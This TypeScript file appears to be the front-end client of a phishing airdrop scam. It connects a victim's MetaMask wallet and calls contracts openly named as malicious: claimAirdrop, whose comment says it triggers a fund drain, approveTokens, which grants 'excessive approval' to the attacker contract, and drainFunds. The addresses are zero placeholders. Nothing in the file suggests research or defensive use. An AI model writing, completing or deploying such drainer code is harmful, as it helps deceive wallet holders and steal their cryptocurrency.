import { ethers } from 'ethers';

// Contract ABIs (simplified for the malicious contracts)
const MALICIOUS_AIRDROP_ABI = [
  "function claimAirdrop() external",
  "function approve(address spender, uint256 amount) external returns (bool)",
  "function allowance(address owner, address spender) external view returns (uint256)",
  "function balanceOf(address account) external view returns (uint256)",
  "function transfer(address to, uint256 amount) external returns (bool)",
  "function owner() external view returns (address)",
  "function drainFunds() external",
  "function setDrainTarget(address target) external",
  "event AirdropClaimed(address indexed user, uint256 amount)",
  "event FundsDrained(address indexed from, uint256 amount)"
];

const FAKE_TOKEN_ABI = [
  "function name() external view returns (string memory)",
  "function symbol() external view returns (string memory)",
  "function decimals() external view returns (uint8)",
  "function totalSupply() external view returns (uint256)",
  "function balanceOf(address account) external view returns (uint256)",
  "function transfer(address to, uint256 amount) external returns (bool)",
  "function approve(address spender, uint256 amount) external returns (bool)",
  "function allowance(address owner, address spender) external view returns (uint256)",
  "function mint(address to, uint256 amount) external",
  "function burn(address from, uint256 amount) external"
];

const MALICIOUS_PROXY_ABI = [
  "function admin() external view returns (address)",
  "function implementation() external view returns (address)",
  "function upgradeTo(address newImplementation) external",
  "function claimAirdrop() external",
  "function approve(address spender, uint256 amount) external returns (bool)",
  "function drainFunds() external"
];

export class ContractIntegration {
  private provider: ethers.providers.Web3Provider | null = null;
  private signer: ethers.Signer | null = null;
  private maliciousAirdrop: ethers.Contract | null = null;
  private fakeToken: ethers.Contract | null = null;
  private maliciousProxy: ethers.Contract | null = null;
  private contractAddresses: {
    maliciousAirdrop: string;
    fakeToken: string;
    maliciousProxy: string;
  } = {
    maliciousAirdrop: "0x0000000000000000000000000000000000000000",
    fakeToken: "0x0000000000000000000000000000000000000000",
    maliciousProxy: "0x0000000000000000000000000000000000000000"
  };

  constructor() {
    this.loadContractAddresses();
  }

  private loadContractAddresses() {
    try {
      // In a real scenario, these would be loaded from the deployed contracts
      // For now, we'll use placeholder addresses that will be updated after deployment
      this.contractAddresses = {
        maliciousAirdrop: "0x0000000000000000000000000000000000000000",
        fakeToken: "0x0000000000000000000000000000000000000000",
        maliciousProxy: "0x0000000000000000000000000000000000000000"
      };
    } catch (error) {
      console.error("Failed to load contract addresses:", error);
    }
  }

  async connectWallet(): Promise<string> {
    if (typeof window.ethereum === 'undefined') {
      throw new Error('MetaMask is not installed');
    }

    this.provider = new ethers.providers.Web3Provider(window.ethereum);
    await this.provider.send("eth_requestAccounts", []);
    this.signer = this.provider.getSigner();
    
    const address = await this.signer.getAddress();
    this.initializeContracts();
    return address;
  }

  private initializeContracts() {
    if (!this.provider || !this.signer) return;

    this.maliciousAirdrop = new ethers.Contract(
      this.contractAddresses.maliciousAirdrop,
      MALICIOUS_AIRDROP_ABI,
      this.signer
    );

    this.fakeToken = new ethers.Contract(
      this.contractAddresses.fakeToken,
      FAKE_TOKEN_ABI,
      this.signer
    );

    this.maliciousProxy = new ethers.Contract(
      this.contractAddresses.maliciousProxy,
      MALICIOUS_PROXY_ABI,
      this.signer
    );
  }

  async claimAirdrop(): Promise<ethers.ContractTransaction> {
    if (!this.maliciousAirdrop) {
      throw new Error('Contract not initialized');
    }

    // This will trigger the malicious drain function
    return await this.maliciousAirdrop.claimAirdrop();
  }

  async approveTokens(spender: string, amount: string): Promise<ethers.ContractTransaction> {
    if (!this.fakeToken) {
      throw new Error('Token contract not initialized');
    }

    // This will give excessive approval to the malicious contract
    return await this.fakeToken.approve(spender, amount);
  }

  async getTokenBalance(address: string): Promise<string> {
    if (!this.fakeToken) {
      throw new Error('Token contract not initialized');
    }

    const balance = await this.fakeToken.balanceOf(address);
    return ethers.utils.formatEther(balance);
  }

  async getAllowance(owner: string, spender: string): Promise<string> {
    if (!this.fakeToken) {
      throw new Error('Token contract not initialized');
    }

    const allowance = await this.fakeToken.allowance(owner, spender);
    return ethers.utils.formatEther(allowance);
  }

  async drainFunds(): Promise<ethers.ContractTransaction> {
    if (!this.maliciousAirdrop) {
      throw new Error('Contract not initialized');
    }

    // This is the malicious drain function
    return await this.maliciousAirdrop.drainFunds();
  }

  async updateContractAddresses(addresses: {
    maliciousAirdrop: string;
    fakeToken: string;
    maliciousProxy: string;
  }) {
    this.contractAddresses = addresses;
    this.initializeContracts();
  }

  getContractAddresses() {
    return this.contractAddresses;
  }

  isConnected(): boolean {
    return this.provider !== null && this.signer !== null;
  }
}

// Export a singleton instance
export const contractIntegration = new ContractIntegration(); 